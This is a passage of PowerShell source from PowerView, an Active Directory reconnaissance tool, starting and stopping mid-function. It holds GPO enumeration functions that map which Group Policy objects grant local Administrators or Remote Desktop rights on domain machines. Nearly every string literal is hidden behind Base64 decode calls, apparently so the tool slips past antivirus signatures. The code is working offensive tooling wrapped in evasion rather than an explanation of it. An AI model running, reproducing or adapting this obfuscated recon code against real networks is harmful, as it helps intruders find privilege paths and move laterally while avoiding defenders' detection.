        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $GPOSearcher = Get-DomainSearcher @SearcherArguments
    }
    PROCESS {
        if ($GPOSearcher) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) {
                $GPOAdsPaths = @()
                if ($SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
                    $OldProperties = $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
                }
                $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
                $TargetComputerName = $Null
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))]) {
                    $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $ComputerIdentity
                    $Computer = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $Computer) {
                        Write-Verbose "[Get-DomainGPO] Computer '$ComputerIdentity' not found!"
                    }
                    $ObjectDN = $Computer.distinguishedname
                    $TargetComputerName = $Computer.dnshostname
                }
                else {
                    $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity
                    $User = Get-DomainUser @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $User) {
                        Write-Verbose "[Get-DomainGPO] User '$UserIdentity' not found!"
                    }
                    $ObjectDN = $User.distinguishedname
                }
                $ObjectOUs = @()
                $ObjectOUs += $ObjectDN.split(',') | ForEach-Object {
                    if($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBVAD0A'))))) {
                        $ObjectDN.SubString($ObjectDN.IndexOf("$($_),"))
                    }
                }
                Write-Verbose "[Get-DomainGPO] object OUs: $ObjectOUs"
                if ($ObjectOUs) {
                    $SearcherArguments.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA='))))
                    $InheritanceDisabled = $False
                    ForEach($ObjectOU in $ObjectOUs) {
                        $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $ObjectOU
                        $GPOAdsPaths += Get-DomainOU @SearcherArguments | ForEach-Object {
                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                                        $Parts = $_.split(';')
                                        $GpoDN = $Parts[0]
                                        $Enforced = $Parts[1]
                                        if ($InheritanceDisabled) {
                                            if ($Enforced -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            $GpoDN
                                        }
                                    }
                                }
                            }
                            if ($_.gpoptions -eq 1) {
                                $InheritanceDisabled = $True
                            }
                        }
                    }
                }
                if ($TargetComputerName) {
                    $ComputerSite = (Get-NetComputerSiteName -ComputerName $TargetComputerName).SiteName
                    if($ComputerSite -and ($ComputerSite -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACoA'))))) {
                        $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $ComputerSite
                        $GPOAdsPaths += Get-DomainSite @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }
                $ObjectDomainDN = $ObjectDN.SubString($ObjectDN.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A')))))
                $SearcherArguments.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA=='))))
                $SearcherArguments.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA='))))
                $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
                $GPOAdsPaths += Get-DomainObject @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose "[Get-DomainGPO] GPOAdsPaths: $GPOAdsPaths"
                if ($OldProperties) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $OldProperties }
                else { $SearcherArguments.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))) }
                $SearcherArguments.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA=='))))
                $GPOAdsPaths | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $_
                    $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBnAHIAbwB1AHAAUABvAGwAaQBjAHkAQwBvAG4AdABhAGkAbgBlAHIAKQA=')))
                    Get-DomainObject @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                            $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwAuAFIAYQB3AA=='))))
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwA='))))
                        }
                        $_
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                    if ($IdentityInstance -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwB8AF4AQwBOAD0ALgAqAA==')))) {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            Write-Verbose "[Get-DomainGPO] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $IdentityDomain
                            $GPOSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GPOSearcher) {
                                Write-Warning "[Get-DomainGPO] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAuACoAfQA=')))) {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                    else {
                        try {
                            $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkADEA')))
                            $IdentityFilter += "(objectguid=$GuidByteString)"
                        }
                        catch {
                            $IdentityFilter += "(displayname=$IdentityInstance)"
                        }
                    }
                }
                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                    Write-Verbose "[Get-DomainGPO] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }
                $GPOSearcher.filter = "(&(objectCategory=groupPolicyContainer)$Filter)"
                Write-Verbose "[Get-DomainGPO] filter string: $($GPOSearcher.filter)"
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { $Results = $GPOSearcher.FindOne() }
                else { $Results = $GPOSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwAuAFIAYQB3AA=='))))
                    }
                    else {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] -and ($SearchBase -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBHAEMAOgAvAC8A'))))) {
                            $GPO = Convert-LDAPProperty -Properties $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $GPODomain = $GPODN.SubString($GPODN.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                                $gpcfilesyspath = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
                                $GPO | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBwAGMAZgBpAGwAZQBzAHkAcwBwAGEAdABoAA=='))) $gpcfilesyspath
                            }
                            catch {
                                Write-Verbose "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                            }
                        }
                        else {
                            $GPO = Convert-LDAPProperty -Properties $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwA='))))
                    }
                    $GPO
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainGPO] Error disposing of the Results object: $_"
                    }
                }
                $GPOSearcher.dispose()
            }
        }
    }
}
function Get-DomainGPOLocalGroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,
        [Switch]
        $ResolveMembersToSIDs,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $ConvertArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $ConvertArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $ConvertArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ConvertArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $SplitOption = [System.StringSplitOptions]::RemoveEmptyEntries
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        Get-DomainGPO @SearcherArguments | ForEach-Object {
            $GPOdisplayName = $_.displayname
            $GPOname = $_.name
            $GPOPath = $_.gpcfilesyspath
            $ParseArgs =  @{ 'GptTmplPath' = "$GPOPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ParseArgs[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            $Inf = Get-GptTmpl @ParseArgs
            if ($Inf -and ($Inf.psbase.Keys -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwACAATQBlAG0AYgBlAHIAcwBoAGkAcAA='))))) {
                $Memberships = @{}
                ForEach ($Membership in $Inf.'Group Membership'.GetEnumerator()) {
                    $Group, $Relation = $Membership.Key.Split('__', $SplitOption) | ForEach-Object {$_.Trim()}
                    $MembershipValue = $Membership.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBNAGUAbQBiAGUAcgBzAFQAbwBTAEkARABzAA==')))]) {
                        $GroupMembers = @()
                        ForEach ($Member in $MembershipValue) {
                            if ($Member -and ($Member.Trim() -ne '')) {
                                if ($Member -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
                                    $ConvertToArguments = @{'ObjectName' = $Member}
                                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $ConvertToArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                                    $MemberSID = ConvertTo-SID @ConvertToArguments
                                    if ($MemberSID) {
                                        $GroupMembers += $MemberSID
                                    }
                                    else {
                                        $GroupMembers += $Member
                                    }
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                        }
                        $MembershipValue = $GroupMembers
                    }
                    if (-not $Memberships[$Group]) {
                        $Memberships[$Group] = @{}
                    }
                    if ($MembershipValue -isnot [System.Array]) {$MembershipValue = @($MembershipValue)}
                    $Memberships[$Group].Add($Relation, $MembershipValue)
                }
                ForEach ($Membership in $Memberships.GetEnumerator()) {
                    if ($Membership -and $Membership.Key -and ($Membership.Key -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcACoA'))))) {
                        $GroupSID = $Membership.Key.Trim('*')
                        if ($GroupSID -and ($GroupSID.Trim() -ne '')) {
                            $GroupName = ConvertFrom-SID -ObjectSID $GroupSID @ConvertArguments
                        }
                        else {
                            $GroupName = $False
                        }
                    }
                    else {
                        $GroupName = $Membership.Key
                        if ($GroupName -and ($GroupName.Trim() -ne '')) {
                            if ($Groupname -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                                $GroupSID = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
                            }
                            elseif ($Groupname -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABEAGUAcwBrAHQAbwBwAA==')))) {
                                $GroupSID = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
                            }
                            elseif ($Groupname -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA')))) {
                                $GroupSID = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))
                            }
                            elseif ($GroupName.Trim() -ne '') {
                                $ConvertToArguments = @{'ObjectName' = $Groupname}
                                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $ConvertToArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                                $GroupSID = ConvertTo-SID @ConvertToArguments
                            }
                            else {
                                $GroupSID = $Null
                            }
                        }
                    }
                    $GPOGroup = New-Object PSObject
                    $GPOGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPODisplayName
                    $GPOGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ATgBhAG0AZQA='))) $GPOName
                    $GPOGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) $GPOPath
                    $GPOGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdAByAGkAYwB0AGUAZABHAHIAbwB1AHAAcwA=')))
                    $GPOGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAdABlAHIAcwA='))) $Null
                    $GPOGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) $GroupName
                    $GPOGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMASQBEAA=='))) $GroupSID
                    $GPOGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAE8AZgA='))) $Membership.Value.Memberof
                    $GPOGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAHMA'))) $Membership.Value.Members
                    $GPOGroup.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBHAHIAbwB1AHAA'))))
                    $GPOGroup
                }
            }
            $ParseArgs =  @{
                'GroupsXMLpath' = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            }
            Get-GroupsXML @ParseArgs | ForEach-Object {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBNAGUAbQBiAGUAcgBzAFQAbwBTAEkARABzAA==')))]) {
                    $GroupMembers = @()
                    ForEach ($Member in $_.GroupMembers) {
                        if ($Member -and ($Member.Trim() -ne '')) {
                            if ($Member -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
                                $ConvertToArguments = @{'ObjectName' = $Groupname}
                                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $ConvertToArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                                $MemberSID = ConvertTo-SID -Domain $Domain -ObjectName $Member
                                if ($MemberSID) {
                                    $GroupMembers += $MemberSID
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                            else {
                                $GroupMembers += $Member
                            }
                        }
                    }
                    $_.GroupMembers = $GroupMembers
                }
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPODisplayName
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ATgBhAG0AZQA='))) $GPOName
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFAAbwBsAGkAYwB5AFAAcgBlAGYAZQByAGUAbgBjAGUAcwA=')))
                $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBHAHIAbwB1AHAA'))))
                $_
            }
        }
    }
}
function Get-DomainGPOUserLocalGroupMapping {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $CommonArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $CommonArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $CommonArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $CommonArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $CommonArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $CommonArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
